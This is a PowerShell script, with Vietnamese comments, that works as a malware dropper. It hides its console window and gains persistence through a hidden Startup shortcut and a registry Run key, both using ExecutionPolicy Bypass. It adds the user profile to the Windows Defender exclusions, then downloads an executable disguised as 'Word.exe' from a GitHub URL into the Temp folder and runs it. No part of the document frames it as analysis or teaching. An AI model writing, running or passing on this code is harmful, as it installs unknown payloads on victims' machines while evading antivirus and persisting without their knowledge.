Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'

function Hide-Console {
    $consolePtr = [Console.Window]::GetConsoleWindow()
    [Console.Window]::ShowWindow($consolePtr, 0)
}

function Test-InternetConnection {
    try {
        # Ping Google DNS (8.8.8.8)
        $pingResult = Test-Connection -ComputerName 8.8.8.8 -Count 1 -Quiet
        return $pingResult
    } catch {
        return $false
    }
}

function Wait-ForInternet {
    while (-not (Test-InternetConnection)) {
        Start-Sleep -Seconds 10
    }
}

function Add-ToStartup {
    $scriptPath = $MyInvocation.MyCommand.Definition
    $startupFolder = [System.IO.Path]::Combine($env:AppData, "Microsoft\Windows\Start Menu\Programs\Startup")

    $WshShell = New-Object -ComObject WScript.Shell
    $shortcut = $WshShell.CreateShortcut("$startupFolder\RunMyScript.lnk")
    $shortcut.TargetPath = "powershell.exe"
    $shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
    $shortcut.Save()
}

function Add-ToRegistry {
    $scriptPath = $MyInvocation.MyCommand.Definition
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    Set-ItemProperty -Path $regPath -Name "RunMyScript" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
}

Hide-Console
Add-ToStartup
Add-ToRegistry

Add-MpPreference -ExclusionPath $env:USERPROFILE

$url = 'https://github.com/MrRoyal1235/checkaccvjppro/raw/main/Word.exe'
$outputFile = [System.IO.Path]::Combine($env:Temp, 'Word.exe')

# File để lưu trạng thái đã tải xuống
$statusFile = [System.IO.Path]::Combine($env:Temp, 'downloaded.status')

# Chỉ tải xuống tệp nếu nó chưa được tải
if (-not (Test-Path $statusFile)) {
    Wait-ForInternet

    Invoke-WebRequest -Uri $url -OutFile $outputFile

    # Tạo file trạng thái đã tải xuống
    New-Item -Path $statusFile -ItemType File
}

# Khởi chạy tệp
Start-Process -FilePath $outputFile
